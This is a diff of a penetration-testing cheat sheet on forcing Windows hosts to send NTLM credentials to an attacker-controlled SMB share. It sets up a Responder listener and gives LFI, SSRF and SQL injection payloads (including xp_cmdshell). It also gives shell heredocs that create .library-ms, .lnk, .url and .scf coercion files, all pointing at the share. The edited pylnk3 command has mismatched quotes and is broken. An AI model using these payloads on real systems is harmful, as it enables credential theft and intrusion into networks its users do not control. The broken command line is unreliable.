@@ -20,7 +20,7 @@ layout:
 ## Listener
 
 ```sh
-sudo responder -I <interface>
+sudo responder -I $INTERFACE -A
 ```
 
 ```sh
@@ -35,27 +35,27 @@ If you discover a web vulnerability (such as LFI, SQLI, XXE, SSRF, SSTI) that al
 
 ```sh
 # LFI
-?page=\\<attaker>\shared
+?page=\\$IP\shared
 
 # SSRF
-?url=file:////<attaker>/shared
+?url=file:////$IP/shared
 
 # SQL Injection
-?id=1' union select null,load_file('\\\\<attaker>\\shared'),null-- -
-?id=1' union select null,(select x from OpenRowset(BULK '\\<attaker>\shared',SINGLE_CLOB) R(x)),null-- -
-?id=1' union select null,(EXEC xp_cmdshell 'dir \\<attaker>\shared'),null-- -
+?id=1' union select null,load_file('\\\\$IP\\shared'),null-- -
+?id=1' union select null,(select x from OpenRowset(BULK '\\$IP\shared',SINGLE_CLOB) R(x)),null-- -
+?id=1' union select null,(EXEC xp_cmdshell 'dir \\$IP\shared'),null-- -
 ```
 
 ### Via .library-ms file
 
 ```sh
-cat > \!shared.library-ms <<EOF
+cat > '!shared.library-ms' <<'EOF'
 <?xml version="1.0" encoding="UTF-8"?>
 <libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
   <searchConnectorDescriptionList>
     <searchConnectorDescription>
       <simpleLocation>
-        <url>\\\\<attacker>\\shared</url>
+        <url>\\\\$IP\\shared</url>
       </simpleLocation>
     </searchConnectorDescription>
   </searchConnectorDescriptionList>
@@ -66,27 +66,27 @@ EOF
 ### Via .lnk file
 
 ```sh
-pylnk3 c '\\<attacker>\shared' \!shared.lnk -i '\\<attacker>\shared\icon.ico'
+pylnk3 c "\\\\$IP\shared' '!shared.lnk' -i "\\$IP\shared\icon.ico"
 ```
 
 ### Via .url file
 
 ```sh
-cat > \!shared.url <<EOF
+cat > '!shared.url' <<'EOF'
 [InternetShortcut]
-URL=\\\\<attacker>\\shared
+URL=\\\\$IP\\shared
 IconIndex=1
-IconFile=\\\\<attacker>\\shared\\icon.ico
+IconFile=\\\\$IP\\shared\\icon.ico
 EOF
 ```
 
 ### Via .scf file
 
 ```sh
-cat > \!shared.scf <<EOF
+cat > '!shared.scf' <<'EOF'
 [Shell]
 Command=2
-IconFile=\\\\<attacker>\\shared\\icon.ico
+IconFile=\\\\$IP\\shared\\icon.ico
 [Taskbar]
 Command=ToggleDesktop
 EOF
